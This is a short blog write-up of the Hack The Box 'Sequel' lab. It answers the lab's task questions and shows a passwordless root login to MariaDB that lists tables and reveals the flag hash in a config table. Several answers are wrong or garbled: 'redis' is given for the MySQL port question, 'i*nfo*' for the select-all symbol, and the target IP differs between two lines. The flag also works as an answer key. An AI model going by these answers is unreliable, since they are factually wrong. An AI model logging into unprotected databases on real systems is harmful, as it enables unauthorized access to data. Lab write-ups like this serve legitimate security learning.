---
layout: post
title: Sequel-HTB
date: 16/08/2022
last_updated: 16/08/2022
tags: blog
---
# Sequel - HTB

## Attacking Ip info
Ip: **10.129.96.232**

### Task 1
Q:  *What does the acronym SQL stand for?*
A: Structured query Language. 

### Task 2
Q:  *During our scan, which port running mysql do we find?* 
A: redis

Redis is a in memory data structure store that supports abstract data structures.

### Task 3
Q:  *What community-developed MySQL version is the target running?*
A: MariaDB

- To get the version of the DB i can use the command 
- ``mysql -h 10.129.95.232 -V
the -V switch gives me the version which results in the output of
```shell
mysql  Ver 15.1 Distrib 10.5.12-MariaDB, for debian-linux-gnu (x86_64) using  EditLine wrapper
```

### Task 4
Q:  *What switch do we need to use in order to specify a login username for the MySQL service?*
A: -u

### Task 5
Q:  *Which username allows us to log into MariaDB without providing a password?*
A: root
`
### Task 6
Q:   *What symbol can we use to specify within the query that we want to display everything inside a table?*
A: i*nfo*
### Task 7
Q:   *What symbol do we need to end each query with?*
A:  ;

# GET THAT FLAG

```shell
show tables *;
ERROR 1046 (3D000): No database selected
MariaDB [(none)]> show databses;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'databses' at line 1
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.276 sec)

MariaDB [(none)]> select * from HTB
    -> ;
ERROR 1046 (3D000): No database selected
MariaDB [(none)]> connect htb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Connection id:    123
Current database: htb

MariaDB [htb]> show tables
    -> ;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.271 sec)

MariaDB [htb]> select * From config
    -> ;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.299 sec)

```